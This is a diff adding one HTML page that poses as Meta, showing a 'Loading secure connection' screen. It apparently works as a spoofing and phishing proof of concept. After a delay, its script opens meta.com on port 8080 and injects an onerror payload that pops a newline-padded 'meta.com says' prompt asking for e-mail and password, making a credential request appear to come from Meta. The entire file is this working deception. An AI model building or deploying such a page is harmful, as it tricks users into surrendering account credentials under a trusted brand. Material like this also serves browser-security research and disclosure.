@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>meta.com</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 500px;
+      padding: 40px;
+    }
+    h1 {
+      color: #4285f4;
+      font-size: 3rem;
+      margin-bottom: 2rem;
+    }
+    .info {
+      font-size: 1.2rem;
+      color: #666;
+      margin-bottom: 3rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Meta</h1>
+    <p class="info">Loading secure connection... Please wait</p>
+  </div>
+
+  <script>
+    function y() {
+      const x = window.open('http://www.meta.com:8080', '_top');
+      x.document.body.innerHTML = `
+        <img src="" onerror="
+          setTimeout(function() {
+            prompt(
+              'meta.com says:\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nSign into your account in order to access meta.com',
+              'E-mail / Password'
+            );
+          }, 150)
+        ">
+      `;
+    }
+    setTimeout(y, 3000);
+  </script>
+
+</body>
+</html>
